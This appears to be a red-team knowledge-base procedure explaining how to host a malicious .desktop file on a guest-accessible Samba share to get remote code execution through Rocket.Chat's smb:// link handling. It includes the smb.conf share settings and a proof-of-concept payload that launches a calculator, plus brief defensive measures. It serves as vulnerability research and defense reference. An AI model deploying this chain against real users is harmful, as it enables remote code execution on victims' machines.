---
id: proc-setup-samba-share
tags:
  - smb
  - payload-hosting
  - rce
type: procedure
tools:
  - '[[tools/Samba]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:23:28.545Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Setup-Malicious-Samba-Share

## Summary

This procedure configures a public Samba server to host an executable .desktop file containing a malicious bash command, enabling RCE when accessed via smb:// in the Rocket.Chat app.

## Description

Samba allows sharing files over SMB protocol, which bypasses the app's file:// blocklist. The .desktop file, when made executable, executes its Exec field on Linux systems upon opening. This targets the vulnerability in links.js (line 24) where shell.openExternal() processes unfiltered protocols. Prerequisites include a domain (e.g., attacker.tld) and network accessibility; outcome is a share ready for link delivery.

## Requirements

1. Linux server with Samba installed and domain/DNS for attacker.tld
2. Write access to a directory for the 'public' share
3. Basic networking to expose port 445

## Defense

Defensive measures and detection strategies:

- Block outbound SMB traffic (port 445) via firewalls
- Monitor for anomalous Samba shares or .desktop files with executable permissions
- Use protocol whitelisting in Electron apps to restrict smb:// and similar

## Objectives

1. Host a payload file accessible via smb://
2. Ensure file executes arbitrary commands on victim open
3. Validate share accessibility without authentication

## Instructions

### Step 1: Configure Samba Share

**Context**: Set up a public share named 'public' on the server.

Edit /etc/samba/smb.conf to add:

```ini
[public]
   path = /path/to/public/share
   browseable = yes
   writable = no
   guest ok = yes
   read only = yes
```

Then restart Samba: `sudo systemctl restart smbd`

> Expected output: Share visible via smb://attacker.tld/public/ from remote systems.

### Step 2: Create and Place Malicious .desktop File

**Context**: Craft the payload file with embedded RCE command and make it executable.

Create pwn.desktop with content:

```ini
[Desktop Entry]
Exec=bash -c "(mate-calc &); xmessage \"Hello from Electron.\""
Type=Application
```

Place in /path/to/public/share/, then `chmod +x pwn.desktop`

> Expected output: File accessible and executable via SMB client test.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Samba]]

## Tags

- smb
- payload-hosting
- rce
